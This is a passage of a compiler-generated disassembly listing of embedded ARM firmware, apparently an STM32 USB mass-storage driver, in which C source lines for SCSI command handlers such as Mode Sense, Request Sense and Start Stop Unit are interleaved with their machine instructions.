  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 8009f32:	68fb      	ldr	r3, [r7, #12]
 8009f34:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009f38:	68fa      	ldr	r2, [r7, #12]
 8009f3a:	33b0      	adds	r3, #176	; 0xb0
 8009f3c:	009b      	lsls	r3, r3, #2
 8009f3e:	4413      	add	r3, r2
 8009f40:	685b      	ldr	r3, [r3, #4]
 8009f42:	685b      	ldr	r3, [r3, #4]
 8009f44:	f107 0214 	add.w	r2, r7, #20
 8009f48:	f107 0110 	add.w	r1, r7, #16
 8009f4c:	7af8      	ldrb	r0, [r7, #11]
 8009f4e:	4798      	blx	r3
 8009f50:	4603      	mov	r3, r0
 8009f52:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009f54:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009f58:	2b00      	cmp	r3, #0
 8009f5a:	d106      	bne.n	8009f6a <SCSI_ReadFormatCapacity+0x62>
 8009f5c:	69bb      	ldr	r3, [r7, #24]
 8009f5e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f62:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009f66:	2b02      	cmp	r3, #2
 8009f68:	d108      	bne.n	8009f7c <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009f6a:	7af9      	ldrb	r1, [r7, #11]
 8009f6c:	233a      	movs	r3, #58	; 0x3a
 8009f6e:	2202      	movs	r2, #2
 8009f70:	68f8      	ldr	r0, [r7, #12]
 8009f72:	f000 f941 	bl	800a1f8 <SCSI_SenseCode>
    return -1;
 8009f76:	f04f 33ff 	mov.w	r3, #4294967295
 8009f7a:	e03e      	b.n	8009ffa <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 8009f7c:	2300      	movs	r3, #0
 8009f7e:	83fb      	strh	r3, [r7, #30]
 8009f80:	e007      	b.n	8009f92 <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 8009f82:	8bfb      	ldrh	r3, [r7, #30]
 8009f84:	69ba      	ldr	r2, [r7, #24]
 8009f86:	4413      	add	r3, r2
 8009f88:	2200      	movs	r2, #0
 8009f8a:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 8009f8c:	8bfb      	ldrh	r3, [r7, #30]
 8009f8e:	3301      	adds	r3, #1
 8009f90:	83fb      	strh	r3, [r7, #30]
 8009f92:	8bfb      	ldrh	r3, [r7, #30]
 8009f94:	2b0b      	cmp	r3, #11
 8009f96:	d9f4      	bls.n	8009f82 <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 8009f98:	69bb      	ldr	r3, [r7, #24]
 8009f9a:	2208      	movs	r2, #8
 8009f9c:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 8009f9e:	693b      	ldr	r3, [r7, #16]
 8009fa0:	3b01      	subs	r3, #1
 8009fa2:	0e1b      	lsrs	r3, r3, #24
 8009fa4:	b2da      	uxtb	r2, r3
 8009fa6:	69bb      	ldr	r3, [r7, #24]
 8009fa8:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 8009faa:	693b      	ldr	r3, [r7, #16]
 8009fac:	3b01      	subs	r3, #1
 8009fae:	0c1b      	lsrs	r3, r3, #16
 8009fb0:	b2da      	uxtb	r2, r3
 8009fb2:	69bb      	ldr	r3, [r7, #24]
 8009fb4:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 8009fb6:	693b      	ldr	r3, [r7, #16]
 8009fb8:	3b01      	subs	r3, #1
 8009fba:	0a1b      	lsrs	r3, r3, #8
 8009fbc:	b2da      	uxtb	r2, r3
 8009fbe:	69bb      	ldr	r3, [r7, #24]
 8009fc0:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 8009fc2:	693b      	ldr	r3, [r7, #16]
 8009fc4:	b2db      	uxtb	r3, r3
 8009fc6:	3b01      	subs	r3, #1
 8009fc8:	b2da      	uxtb	r2, r3
 8009fca:	69bb      	ldr	r3, [r7, #24]
 8009fcc:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 8009fce:	69bb      	ldr	r3, [r7, #24]
 8009fd0:	2202      	movs	r2, #2
 8009fd2:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 8009fd4:	8abb      	ldrh	r3, [r7, #20]
 8009fd6:	141b      	asrs	r3, r3, #16
 8009fd8:	b2da      	uxtb	r2, r3
 8009fda:	69bb      	ldr	r3, [r7, #24]
 8009fdc:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 8009fde:	8abb      	ldrh	r3, [r7, #20]
 8009fe0:	0a1b      	lsrs	r3, r3, #8
 8009fe2:	b29b      	uxth	r3, r3
 8009fe4:	b2da      	uxtb	r2, r3
 8009fe6:	69bb      	ldr	r3, [r7, #24]
 8009fe8:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 8009fea:	8abb      	ldrh	r3, [r7, #20]
 8009fec:	b2da      	uxtb	r2, r3
 8009fee:	69bb      	ldr	r3, [r7, #24]
 8009ff0:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 8009ff2:	69bb      	ldr	r3, [r7, #24]
 8009ff4:	220c      	movs	r2, #12
 8009ff6:	60da      	str	r2, [r3, #12]

  return 0;
 8009ff8:	2300      	movs	r3, #0
}
 8009ffa:	4618      	mov	r0, r3
 8009ffc:	3720      	adds	r7, #32
 8009ffe:	46bd      	mov	sp, r7
 800a000:	bd80      	pop	{r7, pc}
	...

0800a004 <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a004:	b580      	push	{r7, lr}
 800a006:	b086      	sub	sp, #24
 800a008:	af00      	add	r7, sp, #0
 800a00a:	60f8      	str	r0, [r7, #12]
 800a00c:	460b      	mov	r3, r1
 800a00e:	607a      	str	r2, [r7, #4]
 800a010:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a012:	68fb      	ldr	r3, [r7, #12]
 800a014:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a018:	68fb      	ldr	r3, [r7, #12]
 800a01a:	32b0      	adds	r2, #176	; 0xb0
 800a01c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a020:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a022:	2317      	movs	r3, #23
 800a024:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a026:	693b      	ldr	r3, [r7, #16]
 800a028:	2b00      	cmp	r3, #0
 800a02a:	d102      	bne.n	800a032 <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a02c:	f04f 33ff 	mov.w	r3, #4294967295
 800a030:	e011      	b.n	800a056 <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a032:	687b      	ldr	r3, [r7, #4]
 800a034:	3304      	adds	r3, #4
 800a036:	781b      	ldrb	r3, [r3, #0]
 800a038:	b29b      	uxth	r3, r3
 800a03a:	8afa      	ldrh	r2, [r7, #22]
 800a03c:	429a      	cmp	r2, r3
 800a03e:	d303      	bcc.n	800a048 <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a040:	687b      	ldr	r3, [r7, #4]
 800a042:	3304      	adds	r3, #4
 800a044:	781b      	ldrb	r3, [r3, #0]
 800a046:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a048:	8afb      	ldrh	r3, [r7, #22]
 800a04a:	461a      	mov	r2, r3
 800a04c:	4904      	ldr	r1, [pc, #16]	; (800a060 <SCSI_ModeSense6+0x5c>)
 800a04e:	6938      	ldr	r0, [r7, #16]
 800a050:	f000 feb8 	bl	800adc4 <SCSI_UpdateBotData>

  return 0;
 800a054:	2300      	movs	r3, #0
}
 800a056:	4618      	mov	r0, r3
 800a058:	3718      	adds	r7, #24
 800a05a:	46bd      	mov	sp, r7
 800a05c:	bd80      	pop	{r7, pc}
 800a05e:	bf00      	nop
 800a060:	2000011c 	.word	0x2000011c

0800a064 <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a064:	b580      	push	{r7, lr}
 800a066:	b086      	sub	sp, #24
 800a068:	af00      	add	r7, sp, #0
 800a06a:	60f8      	str	r0, [r7, #12]
 800a06c:	460b      	mov	r3, r1
 800a06e:	607a      	str	r2, [r7, #4]
 800a070:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a072:	68fb      	ldr	r3, [r7, #12]
 800a074:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a078:	68fb      	ldr	r3, [r7, #12]
 800a07a:	32b0      	adds	r2, #176	; 0xb0
 800a07c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a080:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a082:	231b      	movs	r3, #27
 800a084:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a086:	693b      	ldr	r3, [r7, #16]
 800a088:	2b00      	cmp	r3, #0
 800a08a:	d102      	bne.n	800a092 <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a08c:	f04f 33ff 	mov.w	r3, #4294967295
 800a090:	e011      	b.n	800a0b6 <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a092:	687b      	ldr	r3, [r7, #4]
 800a094:	3308      	adds	r3, #8
 800a096:	781b      	ldrb	r3, [r3, #0]
 800a098:	b29b      	uxth	r3, r3
 800a09a:	8afa      	ldrh	r2, [r7, #22]
 800a09c:	429a      	cmp	r2, r3
 800a09e:	d303      	bcc.n	800a0a8 <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a0a0:	687b      	ldr	r3, [r7, #4]
 800a0a2:	3308      	adds	r3, #8
 800a0a4:	781b      	ldrb	r3, [r3, #0]
 800a0a6:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a0a8:	8afb      	ldrh	r3, [r7, #22]
 800a0aa:	461a      	mov	r2, r3
 800a0ac:	4904      	ldr	r1, [pc, #16]	; (800a0c0 <SCSI_ModeSense10+0x5c>)
 800a0ae:	6938      	ldr	r0, [r7, #16]
 800a0b0:	f000 fe88 	bl	800adc4 <SCSI_UpdateBotData>

  return 0;
 800a0b4:	2300      	movs	r3, #0
}
 800a0b6:	4618      	mov	r0, r3
 800a0b8:	3718      	adds	r7, #24
 800a0ba:	46bd      	mov	sp, r7
 800a0bc:	bd80      	pop	{r7, pc}
 800a0be:	bf00      	nop
 800a0c0:	20000134 	.word	0x20000134

0800a0c4 <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a0c4:	b580      	push	{r7, lr}
 800a0c6:	b086      	sub	sp, #24
 800a0c8:	af00      	add	r7, sp, #0
 800a0ca:	60f8      	str	r0, [r7, #12]
 800a0cc:	460b      	mov	r3, r1
 800a0ce:	607a      	str	r2, [r7, #4]
 800a0d0:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a0d2:	68fb      	ldr	r3, [r7, #12]
 800a0d4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a0d8:	68fb      	ldr	r3, [r7, #12]
 800a0da:	32b0      	adds	r2, #176	; 0xb0
 800a0dc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a0e0:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a0e2:	693b      	ldr	r3, [r7, #16]
 800a0e4:	2b00      	cmp	r3, #0
 800a0e6:	d102      	bne.n	800a0ee <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a0e8:	f04f 33ff 	mov.w	r3, #4294967295
 800a0ec:	e080      	b.n	800a1f0 <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a0ee:	693b      	ldr	r3, [r7, #16]
 800a0f0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0f4:	699b      	ldr	r3, [r3, #24]
 800a0f6:	2b00      	cmp	r3, #0
 800a0f8:	d10b      	bne.n	800a112 <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a0fa:	693b      	ldr	r3, [r7, #16]
 800a0fc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a100:	7f59      	ldrb	r1, [r3, #29]
 800a102:	2320      	movs	r3, #32
 800a104:	2205      	movs	r2, #5
 800a106:	68f8      	ldr	r0, [r7, #12]
 800a108:	f000 f876 	bl	800a1f8 <SCSI_SenseCode>
    return -1;
 800a10c:	f04f 33ff 	mov.w	r3, #4294967295
 800a110:	e06e      	b.n	800a1f0 <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a112:	2300      	movs	r3, #0
 800a114:	75fb      	strb	r3, [r7, #23]
 800a116:	e007      	b.n	800a128 <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a118:	7dfb      	ldrb	r3, [r7, #23]
 800a11a:	693a      	ldr	r2, [r7, #16]
 800a11c:	4413      	add	r3, r2
 800a11e:	2200      	movs	r2, #0
 800a120:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a122:	7dfb      	ldrb	r3, [r7, #23]
 800a124:	3301      	adds	r3, #1
 800a126:	75fb      	strb	r3, [r7, #23]
 800a128:	7dfb      	ldrb	r3, [r7, #23]
 800a12a:	2b11      	cmp	r3, #17
 800a12c:	d9f4      	bls.n	800a118 <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a12e:	693b      	ldr	r3, [r7, #16]
 800a130:	2270      	movs	r2, #112	; 0x70
 800a132:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a134:	693b      	ldr	r3, [r7, #16]
 800a136:	220c      	movs	r2, #12
 800a138:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a13a:	693b      	ldr	r3, [r7, #16]
 800a13c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a140:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a144:	693b      	ldr	r3, [r7, #16]
 800a146:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a14a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a14e:	429a      	cmp	r2, r3
 800a150:	d03f      	beq.n	800a1d2 <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a152:	693b      	ldr	r3, [r7, #16]
 800a154:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a158:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a15c:	461a      	mov	r2, r3
 800a15e:	693b      	ldr	r3, [r7, #16]
 800a160:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a164:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a168:	693b      	ldr	r3, [r7, #16]
 800a16a:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a16c:	693b      	ldr	r3, [r7, #16]
 800a16e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a172:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a176:	693a      	ldr	r2, [r7, #16]
 800a178:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a17c:	00db      	lsls	r3, r3, #3
 800a17e:	4413      	add	r3, r2
 800a180:	791a      	ldrb	r2, [r3, #4]
 800a182:	693b      	ldr	r3, [r7, #16]
 800a184:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a186:	693b      	ldr	r3, [r7, #16]
 800a188:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a18c:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a190:	693a      	ldr	r2, [r7, #16]
 800a192:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a196:	00db      	lsls	r3, r3, #3
 800a198:	4413      	add	r3, r2
 800a19a:	795a      	ldrb	r2, [r3, #5]
 800a19c:	693b      	ldr	r3, [r7, #16]
 800a19e:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a1a0:	693b      	ldr	r3, [r7, #16]
 800a1a2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1a6:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1aa:	3301      	adds	r3, #1
 800a1ac:	b2da      	uxtb	r2, r3
 800a1ae:	693b      	ldr	r3, [r7, #16]
 800a1b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1b4:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a1b8:	693b      	ldr	r3, [r7, #16]
 800a1ba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1be:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1c2:	2b04      	cmp	r3, #4
 800a1c4:	d105      	bne.n	800a1d2 <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a1c6:	693b      	ldr	r3, [r7, #16]
 800a1c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1cc:	2200      	movs	r2, #0
 800a1ce:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a1d2:	693b      	ldr	r3, [r7, #16]
 800a1d4:	2212      	movs	r2, #18
 800a1d6:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a1d8:	687b      	ldr	r3, [r7, #4]
 800a1da:	3304      	adds	r3, #4
 800a1dc:	781b      	ldrb	r3, [r3, #0]
 800a1de:	2b12      	cmp	r3, #18
 800a1e0:	d805      	bhi.n	800a1ee <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a1e2:	687b      	ldr	r3, [r7, #4]
 800a1e4:	3304      	adds	r3, #4
 800a1e6:	781b      	ldrb	r3, [r3, #0]
 800a1e8:	461a      	mov	r2, r3
 800a1ea:	693b      	ldr	r3, [r7, #16]
 800a1ec:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a1ee:	2300      	movs	r3, #0
}
 800a1f0:	4618      	mov	r0, r3
 800a1f2:	3718      	adds	r7, #24
 800a1f4:	46bd      	mov	sp, r7
 800a1f6:	bd80      	pop	{r7, pc}

0800a1f8 <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a1f8:	b480      	push	{r7}
 800a1fa:	b085      	sub	sp, #20
 800a1fc:	af00      	add	r7, sp, #0
 800a1fe:	6078      	str	r0, [r7, #4]
 800a200:	4608      	mov	r0, r1
 800a202:	4611      	mov	r1, r2
 800a204:	461a      	mov	r2, r3
 800a206:	4603      	mov	r3, r0
 800a208:	70fb      	strb	r3, [r7, #3]
 800a20a:	460b      	mov	r3, r1
 800a20c:	70bb      	strb	r3, [r7, #2]
 800a20e:	4613      	mov	r3, r2
 800a210:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a212:	687b      	ldr	r3, [r7, #4]
 800a214:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a218:	687b      	ldr	r3, [r7, #4]
 800a21a:	32b0      	adds	r2, #176	; 0xb0
 800a21c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a220:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a222:	68fb      	ldr	r3, [r7, #12]
 800a224:	2b00      	cmp	r3, #0
 800a226:	d03d      	beq.n	800a2a4 <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a228:	68fb      	ldr	r3, [r7, #12]
 800a22a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a22e:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a232:	461a      	mov	r2, r3
 800a234:	68fb      	ldr	r3, [r7, #12]
 800a236:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a23a:	78b9      	ldrb	r1, [r7, #2]
 800a23c:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a240:	68fb      	ldr	r3, [r7, #12]
 800a242:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a246:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a24a:	68fa      	ldr	r2, [r7, #12]
 800a24c:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a250:	00db      	lsls	r3, r3, #3
 800a252:	4413      	add	r3, r2
 800a254:	787a      	ldrb	r2, [r7, #1]
 800a256:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a258:	68fb      	ldr	r3, [r7, #12]
 800a25a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a25e:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a262:	68fa      	ldr	r2, [r7, #12]
 800a264:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a268:	00db      	lsls	r3, r3, #3
 800a26a:	4413      	add	r3, r2
 800a26c:	2200      	movs	r2, #0
 800a26e:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a270:	68fb      	ldr	r3, [r7, #12]
 800a272:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a276:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a27a:	3301      	adds	r3, #1
 800a27c:	b2da      	uxtb	r2, r3
 800a27e:	68fb      	ldr	r3, [r7, #12]
 800a280:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a284:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a288:	68fb      	ldr	r3, [r7, #12]
 800a28a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a28e:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a292:	2b04      	cmp	r3, #4
 800a294:	d107      	bne.n	800a2a6 <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a296:	68fb      	ldr	r3, [r7, #12]
 800a298:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a29c:	2200      	movs	r2, #0
 800a29e:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a2a2:	e000      	b.n	800a2a6 <SCSI_SenseCode+0xae>
    return;
 800a2a4:	bf00      	nop
  }
}
 800a2a6:	3714      	adds	r7, #20
 800a2a8:	46bd      	mov	sp, r7
 800a2aa:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a2ae:	4770      	bx	lr

0800a2b0 <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a2b0:	b580      	push	{r7, lr}
 800a2b2:	b086      	sub	sp, #24
 800a2b4:	af00      	add	r7, sp, #0
 800a2b6:	60f8      	str	r0, [r7, #12]
 800a2b8:	460b      	mov	r3, r1
 800a2ba:	607a      	str	r2, [r7, #4]
 800a2bc:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a2be:	68fb      	ldr	r3, [r7, #12]
 800a2c0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2c4:	68fb      	ldr	r3, [r7, #12]
 800a2c6:	32b0      	adds	r2, #176	; 0xb0
 800a2c8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2cc:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a2ce:	697b      	ldr	r3, [r7, #20]
 800a2d0:	2b00      	cmp	r3, #0
 800a2d2:	d102      	bne.n	800a2da <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a2d4:	f04f 33ff 	mov.w	r3, #4294967295
 800a2d8:	e043      	b.n	800a362 <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a2da:	697b      	ldr	r3, [r7, #20]
 800a2dc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2e0:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a2e4:	2b01      	cmp	r3, #1
 800a2e6:	d10f      	bne.n	800a308 <SCSI_StartStopUnit+0x58>
 800a2e8:	687b      	ldr	r3, [r7, #4]
 800a2ea:	3304      	adds	r3, #4
 800a2ec:	781b      	ldrb	r3, [r3, #0]
 800a2ee:	f003 0303 	and.w	r3, r3, #3
 800a2f2:	2b02      	cmp	r3, #2
 800a2f4:	d108      	bne.n	800a308 <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a2f6:	7af9      	ldrb	r1, [r7, #11]
 800a2f8:	2324      	movs	r3, #36	; 0x24
 800a2fa:	2205      	movs	r2, #5
 800a2fc:	68f8      	ldr	r0, [r7, #12]
 800a2fe:	f7ff ff7b 	bl	800a1f8 <SCSI_SenseCode>

    return -1;
 800a302:	f04f 33ff 	mov.w	r3, #4294967295
 800a306:	e02c      	b.n	800a362 <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a308:	687b      	ldr	r3, [r7, #4]
 800a30a:	3304      	adds	r3, #4
 800a30c:	781b      	ldrb	r3, [r3, #0]
 800a30e:	f003 0303 	and.w	r3, r3, #3
 800a312:	2b01      	cmp	r3, #1
 800a314:	d106      	bne.n	800a324 <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a316:	697b      	ldr	r3, [r7, #20]
 800a318:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a31c:	2200      	movs	r2, #0
 800a31e:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a322:	e01a      	b.n	800a35a <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a324:	687b      	ldr	r3, [r7, #4]
 800a326:	3304      	adds	r3, #4
 800a328:	781b      	ldrb	r3, [r3, #0]
 800a32a:	f003 0303 	and.w	r3, r3, #3
 800a32e:	2b02      	cmp	r3, #2
 800a330:	d106      	bne.n	800a340 <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a332:	697b      	ldr	r3, [r7, #20]
 800a334:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a338:	2202      	movs	r2, #2
 800a33a:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a33e:	e00c      	b.n	800a35a <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a340:	687b      	ldr	r3, [r7, #4]
 800a342:	3304      	adds	r3, #4
 800a344:	781b      	ldrb	r3, [r3, #0]
